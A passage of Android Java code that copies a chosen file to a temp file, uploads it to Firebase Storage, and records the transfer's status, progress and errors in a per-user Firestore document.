                StorageReference ref = FirebaseStorage.getInstance().getReference(path);
                ref.putFile(Uri.fromFile(uploadFile), meta)
                        .addOnSuccessListener(t -> {
                            updateTransfer(uid, transferId, "ready", 100, path, uploadMime, null, null);
                            ack.ok("uploaded");
                        })
                        .addOnFailureListener(e -> failUpload(uid, transferId, path, uploadMime, ack,
                                "UPLOAD_FAILED", e.getMessage()))
                        .addOnCompleteListener(t -> {
                            if (uploadFile.exists() && !uploadFile.delete()) {
                                Log.w(TAG, "temp transfer file delete failed");
                            }
                        });
            } catch (Exception e) {
                failUpload(uid, transferId, path, uploadMime, ack, "UPLOAD_FAILED", e.getMessage());
                if (temp != null && temp.exists() && !temp.delete()) {
                    Log.w(TAG, "temp transfer file delete failed");
                }
            }
        });
    }

    private void failUpload(@NonNull String uid,
                            @NonNull String transferId,
                            @NonNull String path,
                            @NonNull String mime,
                            @NonNull Ack ack,
                            @NonNull String errorCode,
                            @Nullable String errorMessage) {
        updateTransfer(uid, transferId, "failed", 0, path, mime, errorCode, errorMessage);
        ack.fail(errorCode, errorMessage);
    }

    @Nullable
    private File copyUriToTempFile(@NonNull Uri uri) throws IOException {
        try (InputStream in = app.getContentResolver().openInputStream(uri)) {
            if (in == null) return null;
            File temp = File.createTempFile("arb_xfer_", ".bin", app.getCacheDir());
            try (FileOutputStream out = new FileOutputStream(temp)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) >= 0) {
                    if (n > 0) out.write(buf, 0, n);
                }
            }
            return temp;
        }
    }

    @NonNull
    private static String normalizeUploadMime(@Nullable String mime) {
        if (mime == null || mime.trim().isEmpty()) {
            return "application/octet-stream";
        }
        String m = mime.trim().toLowerCase(Locale.US);
        if (m.startsWith("image/") || m.startsWith("video/") || m.startsWith("audio/")
                || m.equals("application/pdf") || m.startsWith("text/")
                || m.equals("application/zip") || m.equals("application/octet-stream")) {
            return m;
        }
        if (m.contains("jpeg") || m.contains("jpg")) return "image/jpeg";
        if (m.contains("png")) return "image/png";
        if (m.contains("mp4")) return "video/mp4";
        if (m.contains("mp3") || m.contains("mpeg")) return "audio/mpeg";
        return "application/octet-stream";
    }

    private void updateTransfer(@NonNull String uid,
                                @NonNull String transferId,
                                @NonNull String status,
                                int progress,
                                @Nullable String storagePath,
                                @Nullable String mimeType,
                                @Nullable String errorCode,
                                @Nullable String errorMessage) {
        Map<String, Object> patch = new HashMap<>();
        patch.put("status", status);
        patch.put("progress", progress);
        if (storagePath != null) patch.put("storagePath", storagePath);
        if (mimeType != null && !mimeType.isEmpty()) patch.put("mimeType", mimeType);
        if (errorCode != null) patch.put("errorCode", errorCode);
        if (errorMessage != null) patch.put("errorMessage", errorMessage);
        if ("ready".equals(status) || "failed".equals(status) || "cancelled".equals(status)) {
            patch.put("completedAt", System.currentTimeMillis());
        }
        FirebaseFirestore.getInstance()
                .collection(AppConstants.FIRESTORE_USERS)
                .document(uid)
                .collection(AppConstants.FIRESTORE_TRANSFERS)
                .document(transferId)
                .set(patch, SetOptions.merge())
                .addOnFailureListener(e -> Log.w(TAG, "transfer update failed " + transferId, e));
    }

    public interface Ack {
        void ok(@NonNull String summary);

        void fail(@NonNull String code, @Nullable String message);
    }
}
